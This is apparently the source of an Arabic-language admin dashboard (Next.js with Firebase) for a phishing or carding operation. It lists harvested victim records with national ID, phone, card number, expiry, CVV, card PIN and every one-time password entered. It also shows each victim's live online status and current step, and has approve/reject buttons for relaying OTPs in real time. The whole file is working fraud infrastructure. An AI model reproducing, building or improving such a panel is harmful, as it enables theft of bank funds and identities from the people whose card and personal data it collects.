"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { CheckCircle, Trash2, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ar } from "date-fns/locale";

import { formatDistanceToNow } from "date-fns";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { db, auth, database } from "@/lib/firestore";
import {
  collection,
  doc,
  writeBatch,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from "firebase/firestore";
import { onAuthStateChanged, signOut } from "firebase/auth";
import { playNotificationSound } from "@/lib/actions";
import { onValue, ref } from "firebase/database";

interface Notification {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  createdDate: string;
  notificationCount: number;
  personalInfo?: {
    id: string;
    fullName: string;
    phone: string;
  };
  bank: string;
  cardNumber: string;
  prefix: string;
  year: string;
  month: string;
  cvv: string;
  otp: string;
  pass: string;
  allOtps: string[];
  status?: "pending" | "approved" | "rejected";
  isHidden?: boolean;
  isOnline?: boolean
  lastSeen: string
  country:string
}

export default function NotificationsPage1() {
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [pageName, setPagename] = useState<string>("");
  const [message, setMessage] = useState<boolean>(false);
  const [userStatuses, setUserStatuses] = useState<{ [key: string]: string }>({})

  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
    null
  );
  const [selectedNotification, setSelectedNotification] =
    useState<Notification | null>(null);
  const router = useRouter();
  const fetchUserStatus = (userId: string) => {
    const userStatusRef = ref(database, `/status/${userId}`)

    onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: data.state,
        }))
      } else {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: "offline",
        }))
      }
    })
  }
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login");
      } else {
        const unsubscribeNotifications = fetchNotifications();
        return () => {
          unsubscribeNotifications();
        };
      }
    });

    return () => unsubscribe();
  }, [router]);

  const fetchNotifications = () => {
    setIsLoading(true);
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() } as any))
          .filter(
            (notification: any) => !notification.isHidden
          ) as Notification[];
        setNotifications(notificationsData);
          // Fetch online status for all users
          notificationsData.forEach((notification) => {
            fetchUserStatus(notification.id)
          })
  
        setIsLoading(false);
        playNotificationSound();
      },
      (error) => {
        console.error("Error fetching notifications:", error);
        setIsLoading(false);
      }
    );

    return unsubscribe;
  };
  const handleClearAll = async () => {
    setIsLoading(true);
    try {
      const batch = writeBatch(db);
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id);
        batch.update(docRef, { isHidden: true });
      });
      await batch.commit();
      setNotifications([]);
    } catch (error) {
      console.error("Error hiding all notifications:", error);
    } finally {
      setIsLoading(false);
    }
  };
  function UserStatusBadge({ userId }: { userId: string }) {
    const [status, setStatus] = useState<string>("unknown")

    useEffect(() => {
      const userStatusRef = ref(database, `/status/${userId}`)

      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        if (data) {
          setStatus(data.state)
        } else {
          setStatus("unknown")
        }
      })

      return () => {
        // Clean up the listener when component unmounts
        unsubscribe()
      }
    }, [userId])

    return (
      <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
        <span style={{ fontSize: "12px", color: "#fff" }}>{status === "online" ? "متصل" : "غير متصل"}</span>
      </Badge>
    )
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, { isHidden: true });
      setNotifications(
        notifications.filter((notification) => notification.id !== id)
      );
    } catch (error) {
      console.error("Error hiding notification:", error);
    }
  };

  const handlePageName = (id: string) => {
    setPagename("asd");
  };
  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id);
    await updateDoc(targetPost, {
      status: state,
    });
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
      router.push("/login");
    } catch (error) {
      console.error("Error signing out:", error);
    }
  };

  const handleInfoClick = (
    notification: Notification,
    infoType: "personal" | "card"
  ) => {
    setSelectedNotification(notification);
    setSelectedInfo(infoType);
  };

  const closeDialog = () => {
    setSelectedInfo(null);
    setSelectedNotification(null);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-white-900 text-black flex items-center justify-center">
        جاري التحميل...
      </div>
    );
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-300 text-black p-4">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
          <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h1>
          <div className="flex flex-col sm:flex-row gap-2">
            <Button
              variant="destructive"
              onClick={handleClearAll}
              className="bg-red-500 hover:bg-red-600"
              disabled={notifications.length === 0}
            >
              مسح جميع الإشعارات
            </Button>
            <Button
              variant="outline"
              onClick={handleLogout}
              className="bg-gray-100 hover:bg-gray-100"
            >
              تسجيل الخروج
            </Button>
          </div>
        </div>

        <div className="bg-gray-100 rounded-lg overflow-x-auto">
          <table className="w-full">
            <thead>
              <tr className="border-b border-gray-100">
                <th className="px-4 py-3 text-right">الدولة</th>
                <th className="px-4 py-3 text-right">المعلومات</th>
                <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                <th className="px-4 py-3 text-right">الوقت</th>
                <th className="px-4 py-3 text-center">الحالة</th>
                <th className="px-4 py-3 text-center">حذف</th>
              </tr>
            </thead>
            <tbody>
              {notifications.map((notification) => (
                <tr key={notification.id} className="border-b border-gray-700">
                  <td className="px-4 py-3">
                    {notification?.country}
                  </td>
                  <td className="px-4 py-3">
                    <div className="flex flex-col sm:flex-row gap-2">
                      <Badge
                        variant={
                          notification.hasPersonalInfo
                            ? "default"
                            : "destructive"
                        }
                        className="rounded-md cursor-pointer"
                        onClick={() =>
                          handleInfoClick(notification, "personal")
                        }
                      >
                        {notification.hasPersonalInfo
                          ? "معلومات شخصية"
                          : "لا يوجد معلومات"}
                      </Badge>
                      <Badge
                        variant={
                          notification.cardNumber ? "default" : "destructive"
                        }
                        className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""
                          }`}
                        onClick={() => handleInfoClick(notification, "card")}
                      >
                        {notification.cardNumber
                          ? "معلومات البطاقة"
                          : "لا يوجد بطاقة"}
                      </Badge>
                    </div>
                  </td>
                  <td className="px-4 py-3">
                    خطوه - {notification.currentPage}
                  </td>
                  <td className="px-4 py-3">
                    {formatDistanceToNow(new Date(notification.createdDate), {
                      addSuffix: true,
                      locale: ar,
                    })}
                  </td>{" "}
                  <td className="px-4 py-3 text-center">
                  <UserStatusBadge userId={notification.id} key={notification.id}/>
                  </td>
                  <td className="px-4 py-3 text-center">
                    <Button
                      variant="destructive"
                      size="sm"
                      onClick={() => handleDelete(notification.id)}
                      className="bg-red-500 hover:bg-red-600"
                    >
                      <Trash2 className="h-4 w-4" />
                    </Button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-gray-100 text-black" dir="rtl">
          <DialogHeader>
            <DialogTitle dir="rtl">
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : "معلومات البطاقة"}
            </DialogTitle>
            <DialogDescription>
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية"
                : "تفاصيل معلومات البطاقة"}
            </DialogDescription>
          </DialogHeader>
          {selectedInfo === "personal" &&
            selectedNotification?.personalInfo && (
              <div className="space-y-2">
                <p>
                  <strong>الاسم الكامل:</strong>{" "}
                  {selectedNotification.personalInfo.fullName}
                </p>
                <p>
                  <strong>رقم الهوية:</strong>{" "}
                  {selectedNotification.personalInfo.id}
                </p>
                <p>
                  <strong>رقم الهاتف:</strong>{" "}
                  {selectedNotification.personalInfo.phone}
                </p>
              </div>
            )}
          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-2">
              <p>
                <strong className="text-red-400 mx-4">البنك:</strong>{" "}
                {selectedNotification.bank}
              </p>
              <p></p>
              <p>
                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
                {selectedNotification.cardNumber &&
                  selectedNotification.cardNumber}
                - {selectedNotification.prefix}
              </p>
              <p>
                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{" "}
                {selectedNotification.year}/{selectedNotification.month}
              </p>

              <p className="flex items-center">
                <strong className="text-red-400 mx-4">رمز البطاقة :</strong>{" "}
                {selectedNotification.pass}
              </p>
              <p className="flex items-centerpt-4">
                <strong className="text-red-400 mx-4">رمز التحقق :</strong>{" "}
                {selectedNotification.otp}
              </p>
              <p className="flex items-centerpt-4">
                <strong className="text-red-400 mx-4">رمز الامان :</strong>{" "}
                {selectedNotification.cvv}
              </p>
              <></>
              <p>
                <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
                <div className="grid grid-cols-4">
                  {selectedNotification.allOtps &&
                    selectedNotification.allOtps.map((i, index) => (
                      <Badge key={index}>{i}</Badge>
                    ))}
                </div>
              </p>
              <div className="flex justify-between mx-1">
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedNotification.id);
                    setMessage(true);
                    setTimeout(() => {
                      setMessage(false);
                    }, 3000);
                  }}
                  className="w-full m-3 bg-green-500"
                >
                  قبول
                </Button>
                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedNotification.id);
                    setMessage(true);
                    setTimeout(() => {
                      setMessage(false);
                    }, 3000);
                  }}
                  className="w-full m-3"
                  variant="destructive"
                >
                  رفض
                </Button>
              </div>
              <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
